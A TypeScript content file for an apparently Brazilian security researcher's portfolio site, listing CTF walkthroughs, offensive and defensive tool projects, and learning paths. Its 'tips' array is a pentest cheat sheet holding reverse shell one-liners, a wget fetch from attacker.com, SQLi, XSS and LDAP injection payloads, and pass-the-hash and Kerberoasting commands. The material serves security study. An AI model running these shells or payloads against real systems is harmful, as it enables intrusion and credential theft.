// Central data source for portfolio content
export interface Article {
  title: string;
  slug: string;
  excerpt: string;
  date: string;
  author: string;
  category: string;
  tags: string[];
  difficulty: "Beginner" | "Intermediate" | "Advanced";
  readTime: number; // in minutes
}

export interface Tool {
  name: string;
  description: string;
  language: string;
  category: string;
  githubUrl: string;
  downloadUrl: string;
  stars?: number;
  featured?: boolean;
}

export interface Skill {
  category: string;
  items: string[];
}

export interface Project {
  title: string;
  description: string;
  image?: string;
  tags: string[];
  githubUrl?: string;
  liveUrl?: string;
  featured: boolean;
}

export interface LearningPath {
  id: string;
  title: string;
  description: string;
  steps: {
    step: number;
    title: string;
    description: string;
    articleSlugs: string[];
    difficulty: "Beginner" | "Intermediate" | "Advanced";
  }[];
  duration: string;
  icon: string;
}

export interface Tip {
  id: string;
  title: string;
  content: string;
  category: string;
  difficulty: "Beginner" | "Intermediate" | "Advanced";
  code?: string;
  tags: string[];
}

export interface Certificate {
  name: string;
  issuer: string;
  date: string;
  url?: string;
  icon: string;
}

export interface GitHubRepo {
  name: string;
  description: string;
  url: string;
  stars: number;
  language: string;
  topics: string[];
}

// Featured Articles
export const articles: Article[] = [
  {
    title: "Fluffy Machine HTB",
    slug: "fluffy-machine-htb",
    excerpt: "Passo a passo da máquina Fluffy Machine (HTB), desde a enumeração SMB e captura de hash NTLMv2 até a escalada de privilégios em Active Directory.",
    date: "2025-08-16",
    author: "fe1ps",
    category: "HackTheBox",
    tags: ["SMB", "Active Directory", "Privilege Escalation", "Certificates"],
    difficulty: "Advanced",
    readTime: 15,
  },
  {
    title: "Try Hack Me - RootMe",
    slug: "tryhackme-rootme",
    excerpt: "Walkthrough da máquina RootMe do TryHackMe, abordando upload de shell reverso e escalação de privilégios via SUID.",
    date: "2025-09-04",
    author: "fe1ps",
    category: "TryHackMe",
    tags: ["Shell Upload", "SUID", "Privilege Escalation"],
    difficulty: "Beginner",
    readTime: 8,
  },
  {
    title: "TryHackMe - Simple CTF",
    slug: "tryhackme-simple-ctf",
    excerpt: "Walkthrough explorando CVE-2019-9053 (SQLi) no CMS Made Simple e escalando privilégios com sudo vim.",
    date: "2025-09-04",
    author: "fe1ps",
    category: "TryHackMe",
    tags: ["SQLi", "CVE", "Privilege Escalation"],
    difficulty: "Intermediate",
    readTime: 10,
  },
  {
    title: "Try Hack Me - OverPass",
    slug: "tryhackme-overpass",
    excerpt: "Explorando chave SSH fraca e escalação de privilégios via Crontab Hijacking.",
    date: "2025-09-06",
    author: "fe1ps",
    category: "TryHackMe",
    tags: ["SSH", "Crontab", "Privilege Escalation"],
    difficulty: "Intermediate",
    readTime: 9,
  },
  {
    title: "TryHackMe - Brute It",
    slug: "tryhackme-bruteit",
    excerpt: "Focando em brute force com Hydra, quebra de senha de chave SSH com John the Ripper.",
    date: "2025-09-06",
    author: "fe1ps",
    category: "TryHackMe",
    tags: ["Brute Force", "SSH", "John the Ripper"],
    difficulty: "Intermediate",
    readTime: 11,
  },
];

// Featured Tools
export const tools: Tool[] = [
  {
    name: "Ransomware Analysis Toolkit",
    description: "Toolkit educacional para análise de ransomware com implementação de criptografia RSA-4096 e AES-256-GCM. Perfeito para entender técnicas de encryption e malware analysis.",
    language: "Python",
    category: "Security",
    githubUrl: "https://github.com/felinux0x/ransomware-analysis-toolkit",
    downloadUrl: "https://github.com/felinux0x/ransomware-analysis-toolkit",
    stars: 34,
    featured: true,
  },
  {
    name: "RATao - Remote Admin Tool",
    description: "Ferramenta educacional de Remote Access desenvolvida em C# e .NET para demonstrar post-exploitation e command & control. Inclui implementação de ofuscação e técnicas anti-análise.",
    language: "C#",
    category: "Security",
    githubUrl: "https://github.com/felinux0x/RATao",
    downloadUrl: "https://github.com/felinux0x/RATao",
    stars: 28,
    featured: true,
  },
  {
    name: "Python IDS Framework",
    description: "Sistema de Detecção de Intrusão (IDS) baseado em regras, desenvolvido em Python com Scapy para análise profunda de pacotes e detecção de anomalias.",
    language: "Python",
    category: "Security",
    githubUrl: "https://github.com/felinux0x/python-ids-framework",
    downloadUrl: "https://github.com/felinux0x/python-ids-framework",
    stars: 22,
    featured: true,
  },
  {
    name: "PyVigil - HIDS",
    description: "Host-based Intrusion Detection System que monitora logs em tempo real para detectar atividades suspeitas em sistemas Linux.",
    language: "Python",
    category: "Security",
    githubUrl: "https://github.com/felinux0x/PyVigial",
    downloadUrl: "https://github.com/felinux0x/PyVigial",
    stars: 19,
    featured: true,
  },
  {
    name: "Arch Pentest Installer",
    description: "Script shell para provisionar um ambiente de Pentest e CTF automaticamente em sistemas Arch Linux com todas as ferramentas essenciais.",
    language: "Shell",
    category: "Tools",
    githubUrl: "https://github.com/felinux0x/arch-pentest-installer",
    downloadUrl: "https://github.com/felinux0x/arch-pentest-installer",
    stars: 15,
    featured: true,
  },
  {
    name: "Spectro - String Obfuscation",
    description: "Ferramenta educacional em Go para demonstrar técnicas de ofuscação de strings com vários algoritmos e transformações de código.",
    language: "Go",
    category: "Tools",
    githubUrl: "https://github.com/felinux0x/spectro-go",
    downloadUrl: "https://github.com/felinux0x/spectro-go",
    stars: 11,
    featured: true,
  },
];

// Skills
export const skills: Skill[] = [
  {
    category: "Offensive Security",
    items: ["Penetration Testing", "Red Team", "Exploit Development", "Social Engineering"],
  },
  {
    category: "Technologies",
    items: ["Python", "Go", "Shell Script", "JavaScript/TypeScript", "Next.js"],
  },
  {
    category: "Tools & Frameworks",
    items: ["Metasploit", "Burp Suite", "Scapy", "Hydra", "John the Ripper", "Wireshark"],
  },
  {
    category: "Operating Systems",
    items: ["Linux (Arch, Debian)", "Windows", "macOS"],
  },
];

// Learning Paths
export const learningPaths: LearningPath[] = [
  {
    id: "web-security-basics",
    title: "Segurança Web do Zero",
    description: "Aprenda os fundamentos de segurança web e exploração de vulnerabilidades comuns",
    icon: "🌐",
    duration: "2-3 semanas",
    steps: [
      {
        step: 1,
        title: "Conceitos Fundamentais",
        description: "Entenda HTTP, HTTPS, cookies e sessões",
        articleSlugs: ["tryhackme-simple-ctf"],
        difficulty: "Beginner",
      },
      {
        step: 2,
        title: "OWASP Top 10",
        description: "Explore as 10 vulnerabilidades mais críticas",
        articleSlugs: ["tryhackme-simple-ctf"],
        difficulty: "Intermediate",
      },
      {
        step: 3,
        title: "Teste de Penetração",
        description: "Aprenda técnicas avançadas de pentest web",
        articleSlugs: ["tryhackme-simple-ctf"],
        difficulty: "Advanced",
      },
    ],
  },
  {
    id: "linux-privesc",
    title: "Privilege Escalation no Linux",
    description: "Domine técnicas de escalação de privilégios em sistemas Linux",
    icon: "🐧",
    duration: "3-4 semanas",
    steps: [
      {
        step: 1,
        title: "Fundamentals",
        description: "Usuários, permissões e grupos no Linux",
        articleSlugs: ["tryhackme-rootme"],
        difficulty: "Beginner",
      },
      {
        step: 2,
        title: "SUID & Capabilities",
        description: "Explorar binários SUID e capabilities",
        articleSlugs: ["tryhackme-rootme"],
        difficulty: "Intermediate",
      },
      {
        step: 3,
        title: "Advanced Techniques",
        description: "Kernel exploits e técnicas avançadas",
        articleSlugs: ["tryhackme-rootme"],
        difficulty: "Advanced",
      },
    ],
  },
  {
    id: "active-directory",
    title: "Dominando Active Directory",
    description: "Aprenda ataque e defesa em ambientes Active Directory",
    icon: "🏰",
    duration: "4-5 semanas",
    steps: [
      {
        step: 1,
        title: "Fundamentals AD",
        description: "Estrutura, usuários e grupos no AD",
        articleSlugs: ["fluffy-machine-htb"],
        difficulty: "Intermediate",
      },
      {
        step: 2,
        title: "Enumeração",
        description: "Técnicas de enumeração e reconhecimento",
        articleSlugs: ["fluffy-machine-htb"],
        difficulty: "Intermediate",
      },
      {
        step: 3,
        title: "Exploração",
        description: "Kerberoasting, Pass-the-Hash e mais",
        articleSlugs: ["fluffy-machine-htb"],
        difficulty: "Advanced",
      },
    ],
  },
  {
    id: "binary-exploitation",
    title: "Binary Exploitation & Reverse Engineering",
    description: "Aprenda exploração binária desde análise até exploração",
    icon: "⚙️",
    duration: "5-6 semanas",
    steps: [
      {
        step: 1,
        title: "Assembly & Arquitetura",
        description: "x86/x64 assembly, registradores, stack e convenções de chamada",
        articleSlugs: [],
        difficulty: "Intermediate",
      },
      {
        step: 2,
        title: "Vulnerabilidades de Memória",
        description: "Buffer Overflow, Stack Overflow, Format Strings",
        articleSlugs: [],
        difficulty: "Intermediate",
      },
      {
        step: 3,
        title: "Advanced Exploitation",
        description: "ROP chains, Heap exploitation, ASLR e bypasses",
        articleSlugs: [],
        difficulty: "Advanced",
      },
    ],
  },
  {
    id: "network-security",
    title: "Network Penetration Testing",
    description: "Técnicas avançadas de penetração em redes e sistemas",
    icon: "🌍",
    duration: "3-4 semanas",
    steps: [
      {
        step: 1,
        title: "Reconnaissance & Scanning",
        description: "nmap, masscan, mapeamento de rede e enumeração de serviços",
        articleSlugs: [],
        difficulty: "Beginner",
      },
      {
        step: 2,
        title: "Exploração de Vulnerabilidades",
        description: "Vulnerabilidades de rede, protocolo e aplicação",
        articleSlugs: [],
        difficulty: "Intermediate",
      },
      {
        step: 3,
        title: "Pivoting & Lateral Movement",
        description: "Movimento lateral, tunneling, portforwarding e post-exploitation",
        articleSlugs: [],
        difficulty: "Advanced",
      },
    ],
  },
  {
    id: "malware-analysis",
    title: "Malware Analysis & Reverse Engineering",
    description: "Análise estática e dinâmica de malware e binários maliciosos",
    icon: "🦠",
    duration: "4-5 semanas",
    steps: [
      {
        step: 1,
        title: "Static Analysis",
        description: "Análise de arquivos PE, strings, imports, headers sem executar",
        articleSlugs: [],
        difficulty: "Intermediate",
      },
      {
        step: 2,
        title: "Dynamic Analysis",
        description: "Sandboxing, monitoramento de comportamento, análise de API calls",
        articleSlugs: [],
        difficulty: "Intermediate",
      },
      {
        step: 3,
        title: "Advanced Techniques",
        description: "Deobfuscação, análise de packed binários, anti-análise",
        articleSlugs: [],
        difficulty: "Advanced",
      },
    ],
  },
  {
    id: "bug-bounty-recon",
    title: "Bug Bounty & Reconnaissance",
    description: "Técnicas profissionais de recon e identificação de vulnerabilidades",
    icon: "🔍",
    duration: "3-4 semanas",
    steps: [
      {
        step: 1,
        title: "Passive Reconnaissance",
        description: "OSINT, DNS enumeration, tecnologias detectadas, histórico",
        articleSlugs: [],
        difficulty: "Beginner",
      },
      {
        step: 2,
        title: "Active Scanning",
        description: "Vulnerability scanners, port scanning, enumeração de endpoints",
        articleSlugs: [],
        difficulty: "Intermediate",
      },
      {
        step: 3,
        title: "Exploitation & Reporting",
        description: "Exploração responsável e documentação de vulnerabilidades",
        articleSlugs: [],
        difficulty: "Advanced",
      },
    ],
  },
];

// Tips & Tricks
export const tips: Tip[] = [
  {
    id: "tip-1",
    title: "Reverse Shell One-Liners",
    category: "Shells",
    difficulty: "Beginner",
    content: "Colecção de one-liners úteis para obter reverse shells em diferentes linguagens",
    code: `# Bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Netcat
nc -e /bin/sh 10.10.10.10 4444`,
    tags: ["reverse-shell", "exploitation", "bash", "python"],
  },
  {
    id: "tip-2",
    title: "Transferência de Arquivos Rápida",
    category: "Transfer",
    difficulty: "Beginner",
    content: "Métodos rápidos para transferir arquivos durante um pentest",
    code: `# HTTP Server Python 3
python3 -m http.server 8000

# Simple HTTP Upload (com Curl)
curl -X POST -F "file=@arquivo.txt" http://target.com/upload

# Wget
wget http://attacker.com/file.sh -O /tmp/file.sh`,
    tags: ["transfer", "http", "python"],
  },
  {
    id: "tip-3",
    title: "Crack SSH Keys com John",
    category: "Cracking",
    difficulty: "Intermediate",
    content: "Como quebrar senhas de chaves SSH protegidas",
    code: `# Converter chave SSH para formato John
ssh2john id_rsa > id_rsa.hash

# Crack com wordlist
john --wordlist=rockyou.txt id_rsa.hash

# Crack SSH passphrase
john --format=ssh --wordlist=/path/to/wordlist id_rsa.hash`,
    tags: ["ssh", "john", "cracking"],
  },
  {
    id: "tip-4",
    title: "Enumeração SMB com Null Session",
    category: "Enumeration",
    difficulty: "Intermediate",
    content: "Extrair informações de SMB sem autenticação",
    code: `# Listar shares
smbclient -L //target -N

# Enumerar users
rpcclient -U "" -N target
> enumdomusers

# Null session mount
mount -t cifs //target/share /mnt/smb -o username=,password=`,
    tags: ["smb", "enumeration", "network"],
  },
  {
    id: "tip-5",
    title: "Kerberoasting - Extrair & Crackear Tickets",
    category: "Active Directory",
    difficulty: "Advanced",
    content: "Exploração de Service Principal Names (SPNs) para obter credenciais em AD",
    code: `# GetUserSPNs (impacket)
python3 GetUserSPNs.py -request -dc-ip 10.10.10.10 DOMAIN/user:password

# Rubeus (Windows)
rubeus.exe kerberoast /outfile:hashes.txt

# Hashcat crack
hashcat -m 13100 hashes.txt wordlist.txt --force`,
    tags: ["kerberos", "ad", "cracking"],
  },
  {
    id: "tip-6",
    title: "SQL Injection Avançado",
    category: "Web Security",
    difficulty: "Intermediate",
    content: "Técnicas de SQL Injection e bypass de WAF",
    code: `# Union-based SQLi
1' UNION SELECT NULL,username,password FROM users -- 

# Time-based blind SQLi
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- 

# Boolean-based blind
1' AND (SELECT COUNT(*) FROM users) > 0 -- `,
    tags: ["sqli", "web", "database"],
  },
  {
    id: "tip-7",
    title: "Lateral Movement em AD com Pass-the-Hash",
    category: "Active Directory",
    difficulty: "Advanced",
    content: "Técnicas de movimento lateral sem credenciais de texto plano",
    code: `# PSExec com hash
python3 psexec.py -hashes :NTLM_HASH DOMAIN/user@target

# SMB com hash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:HASH DOMAIN/user@target

# Metasploit
use exploit/windows/smb/psexec
set RHOSTS target
set SMBPass HASH`,
    tags: ["ad", "lateral-movement", "windows"],
  },
  {
    id: "tip-8",
    title: "XSS Bypass & Payloads",
    category: "Web Security",
    difficulty: "Advanced",
    content: "Técnicas para contornar filtros XSS e injetar payloads",
    code: `# HTML entity encoding bypass
<img src=x onerror="alert(1)">

# SVG vector bypass
<svg onload="alert(1)">

# Event handler bypass
<body onload="alert(1)">
<iframe src="javascript:alert(1)">

# Dom clobbering
<img id=alert><img id=alert src=x onerror=eval(src=src)>`,
    tags: ["xss", "web", "bypass"],
  },
  {
    id: "tip-9",
    title: "Buffer Overflow & ROP Chains",
    category: "Binary Exploitation",
    difficulty: "Advanced",
    content: "Exploração de vulnerabilidades de buffer overflow com ROP",
    code: `# GDB para encontrar offset
run <<< $(python3 -c "print('A'*100)")
info registers

# Gerar ROP chain com ROPgadget
ROPgadget.py --binary ./app --rop --chain execve

# Exploit template
python3 -c "print('A'*offset + 'ROP_CHAIN' + shellcode)" | ./app`,
    tags: ["binary", "exploitation", "rop"],
  },
  {
    id: "tip-10",
    title: "LDAP Injection & Filter Bypass",
    category: "Web Security",
    difficulty: "Advanced",
    content: "Exploração de filtros LDAP em autenticação",
    code: `# LDAP Filter Injection
*
*)(|(uid=*
admin*

# Bypass de filtro
(|(uid=admin)(|(uid=*

# ldapsearch exfiltração
ldapsearch -h target -x -b "dc=domain,dc=com" "(uid=*)" | grep -i password`,
    tags: ["ldap", "injection", "authentication"],
  },
];

// Certificações & Achievements
export const certificates: Certificate[] = [
  {
    name: "Hack The Box",
    issuer: "HackTheBox",
    date: "2025",
    url: "https://app.hackthebox.com/profile/2483868",
    icon: "🎯",
  },
  {
    name: "TryHackMe Badges",
    issuer: "TryHackMe",
    date: "2025",
    url: "https://tryhackme.com/p/Fe1ps",
    icon: "🏆",
  },
  {
    name: "Open Source Contributor",
    issuer: "GitHub",
    date: "2024-2025",
    icon: "⭐",
  },
  {
    name: "Red Team Practitioner",
    issuer: "Self-Study",
    date: "2024-2025",
    icon: "🔴",
  },
];

// GitHub Repositories
export const gitHubRepos: GitHubRepo[] = [
  {
    name: "Ransomware Analysis Toolkit",
    description: "Toolkit educacional para análise de ransomware com RSA-4096 e AES-256-GCM encryption",
    url: "https://github.com/felinux0x/ransomware-analysis-toolkit",
    stars: 34,
    language: "Python",
    topics: ["malware-analysis", "ransomware", "cryptography", "educational"],
  },
  {
    name: "RATao - Remote Admin Tool",
    description: "Ferramenta educacional de Remote Access com C#/.NET e técnicas anti-análise",
    url: "https://github.com/felinux0x/RATao",
    stars: 28,
    language: "C#",
    topics: ["rat", "c-sharp", "post-exploitation", "educational"],
  },
  {
    name: "Python IDS Framework",
    description: "Network Intrusion Detection System com análise profunda de pacotes Scapy",
    url: "https://github.com/felinux0x/python-ids-framework",
    stars: 22,
    language: "Python",
    topics: ["ids", "network-security", "scapy", "detection"],
  },
  {
    name: "PyVigil - HIDS",
    description: "Host-based Intrusion Detection System com monitoramento em tempo real",
    url: "https://github.com/felinux0x/PyVigial",
    stars: 19,
    language: "Python",
    topics: ["hids", "security", "monitoring", "linux"],
  },
  {
    name: "Arch Pentest Installer",
    description: "Automated pentest environment provisioning para Arch Linux",
    url: "https://github.com/felinux0x/arch-pentest-installer",
    stars: 15,
    language: "Shell",
    topics: ["pentest", "arch-linux", "automation", "setup"],
  },
  {
    name: "Spectro - String Obfuscation",
    description: "String obfuscation toolkit desenvolvido em Go",
    url: "https://github.com/felinux0x/spectro-go",
    stars: 11,
    language: "Go",
    topics: ["obfuscation", "go", "security", "strings"],
  },
];

// Featured Projects
export const projects: Project[] = [
  {
    title: "PyVigil - Host-based IDS",
    description: "Sistema de detecção de intrusões em tempo real para monitoramento de hosts.",
    tags: ["Python", "Security", "HIDS"],
    githubUrl: "https://github.com/felinux0x/PyVigial",
    featured: true,
  },
  {
    title: "Python IDS Framework",
    description: "Framework de IDS baseado em regras com análise profunda de pacotes.",
    tags: ["Python", "Network Security", "Scapy"],
    githubUrl: "https://github.com/felinux0x/python-ids-framework",
    featured: true,
  },
];

// Helper functions
export const getFeaturedArticles = () => articles.slice(0, 3);
export const getFeaturedTools = () => tools.filter(t => t.featured);
export const getArticlesByCategory = (category: string) => articles.filter(a => a.category === category);
export const getArticlesByTag = (tag: string) => articles.filter(a => a.tags.includes(tag));
export const getToolsByCategory = (category: string) => tools.filter(t => t.category === category);
export const getTipsByCategory = (category: string) => tips.filter(t => t.category === category);
export const getCertificatesByYear = (year: string) => certificates.filter(c => c.date.includes(year));
